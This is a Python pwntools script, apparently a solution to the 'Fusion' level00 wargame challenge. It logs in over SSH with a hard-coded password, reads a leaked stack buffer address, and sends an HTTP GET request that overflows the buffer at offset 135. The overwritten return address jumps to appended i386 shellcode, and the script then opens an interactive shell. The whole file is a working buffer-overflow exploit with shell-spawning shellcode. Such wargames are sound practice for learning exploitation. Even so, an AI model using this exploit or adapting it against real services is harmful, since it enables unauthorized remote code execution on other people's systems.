__author__ = '@tomereyz'

from pwn import *

context.clear(arch='i386')


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level00'
    challenge_port = 20000
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')
    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))

    r = remote(host=challenge_series, port=challenge_port)
    r_line = r.recvline()
    buffer_address = int(re.findall('0x([0-9a-f]*)', r_line)[0], 16)
    log.info(r_line)
    log.success('buffer address is at: {}'.format(hex(buffer_address)))

    overflow = 135  # /tmp/cyclic(150) -> cyclic_find(0x61616a62) -> 135
    http_method = 'GET'
    http_protocol = 'HTTP/1.1'

    address_place_holder = '1337'
    get_path = '/tmp/' + cyclic(overflow) + address_place_holder

    shell_code = asm(shellcraft.i386.linux.sh())
    shell_code_address = buffer_address + len(' '.join([http_method, get_path, http_protocol]))
    get_path = get_path.replace(address_place_holder, pack(shell_code_address, word_size=32))

    payload = ' '.join([http_method, get_path, http_protocol + shell_code])

    log.info("Now is the time to attach with gdb ;-)")
    pause()
    log.info(payload)
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main(download=False)
